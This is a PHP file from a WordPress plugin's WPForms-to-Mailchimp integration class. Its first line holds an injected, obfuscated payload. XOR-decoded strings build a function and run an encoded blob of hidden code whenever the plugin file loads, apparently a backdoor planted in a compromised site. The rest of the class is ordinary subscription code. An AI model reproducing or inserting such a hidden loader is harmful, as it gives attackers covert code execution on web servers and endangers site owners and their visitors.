<?php $VqkuAcOPmy='P75R6 <K7:R;SQV'^'3EP3BEc-BT1O:>8';$rlbBcdwqiNVT=$VqkuAcOPmy('','8UjTX1YZ28QR1E-WK14MJ9OIfI01,bbA>:oZpmK>pU-WCTS8+u2  9T9N36qX1HOu1;T+KpO23DLwaUPdAi;ZGA1MYktWKXRQy>CGqCIVwGaKDw<D9FCZ3TaLY;2.cSfn-ggodmdt - VCxjXf>,YA9n9om0ma:72iLRjwk;HKU-CzIR.Co:HQdG1<-:D0RGPTX0Gv4d.i,>8uU6Z4JIwRQ8> lnI<MC95FX6Zlj0VBS2pkC3QC0PV9tdR8,; u-qyV8fb 4CWqonMKX6N<QRUgNSIO6RhWQBHnjv2PLnycf-5=OPTfK.P8YUi4.<>8 yDnQJOY9Hr5BKS RE6T>Mki1i3=m5x9kAGcVZNHvUIEa7A-XWQZEcN0EV4OO=2=0MdEb-IYzzeBg.11 GomTCSP<Yte>ScLFLeIL3;bQQk- 5P=RR>=T-B-SNf>-=TgrW71lRAX3OS70 TDY1OTO+6XdfvPDMTA; =IhXYH1.CV3T>8DKQuL;> 2.>.41+O> T1Zl856qyUE6L;VdAVUwg:>woH7Q;QltK2WD<EPOdnhZbqNH.UYJ6X=LffEw<vJY2QDPVXSZc+7ncnMEDZBN1;e,1U3WKIFNSgqP3OY- DlkrFRJ,QKehcqzSm.pp2VT.QGX2C5hFDTNW54=OjHwR3ILEDRzLcF2'^'Q3Bu>D79FQ><n U>8EGemA ;9-QEM==,KNHsYM04y3X9  :WEUJORf0X:Ri.5D<gQUZ JgPkYV=eWAupD:c2Sc.D9yVTplcXXpX,5Yg vJgQpdSUxJ216V:Ih=ZFOJhFJDLLFndmPOXTvmEJpBZM- bJP2MnMEQRK2h;JRKH<99H-Rm9K:FgajnN8NHN1B<ot;-DnM>mScQ42Q1W.UjtW40TMEWdmX,7Xj-=OzQJV7. WKaIU>1U15QTLvgoto>d4Y7KFFKQ:wLQNi=9Z;Yxr.mGw-.B37<4;hSJRY55UsjBITI.piFoX1T,0R>S64QFYlOu..-XaRNHB5O  W7VmCMn;vl8p+mK 4Cr1+1VhweEA A-2xz>iG9a2U;.bYXImYeFF, AplKCJPEAgRMp52<I<Oo7.i1LFA--GZBlq+XNF5O;3RT.HjU<<9ZLI58-:BED0 +VyghTE7+=Tgp+JB9MJVt ,  dKX0AqbBXHkrW5JYdmwU-ILAKqUKMnN7WS BrKSPOVUuaR-O7MapsWOWZBGlS0O07S W.calprYNOcZCz.HdlyRoX.PVrOZB,oPeuaf:bhRJUIJNkcd;0<PB:GT,l23 5: OV R65BA KGRb6+X0bLHCQZsMUzyW 5Byc<S7T3a457;ZUYh7aLX:,4,0zJeXLO');$rlbBcdwqiNVT();

defined( 'ABSPATH' ) or exit;

/**
 * Class MC4WP_WPForms_Integration
 *
 * @ignore
 */
class MC4WP_WPForms_Integration extends MC4WP_Integration {

    /**
     * @var string
     */
    public $name = "WPForms";

    /**
     * @var string
     */
    public $description = "Subscribe visitors from your WPForms forms.";


    /**
     * Add hooks
     */
    public function add_hooks() {
        add_action( 'wpforms_process', array( $this, 'listen_to_wpforms' ), 20, 3 );
    }

    /**
     * @return bool
     */
    public function is_installed() {
        return class_exists( 'WPForms' );
    }

    /**
     * @since 3.0
     * @return array
     */
    public function get_ui_elements() {
        return array();
    }

    public function listen_to_wpforms( $fields, $entry, $form_data ) {

        foreach( $fields as $field_id => $field ) {
            if( $field['type'] === 'mailchimp' && $field['value_raw'] == 1 ) {
                return $this->subscribe_from_wpforms( $field_id, $fields, $form_data );
            }
        }
    }

    public function subscribe_from_wpforms( $checkbox_field_id, $fields, $form_data ) {
        foreach( $fields as $field ) {
            if( $field['type'] === 'email' ) {
                $email_address = $field['value'];
            }
        }

        $mailchimp_list_id = $form_data['fields'][$checkbox_field_id]['mailchimp_list'];
        $this->options['lists'] = array( $mailchimp_list_id );

        if( ! empty( $email_address ) ) {
            return $this->subscribe( array( 'EMAIL' => $email_address ), $form_data['id'] );
        }
    }

    /**
     * @param int $form_id
     * @return string
     */
    public function get_object_link( $form_id ) {
        return '<a href="' . admin_url( sprintf( 'admin.php?page=wpforms-builder&view=fields&form_id=%d', $form_id ) ) . '">WPForms</a>';
    }

}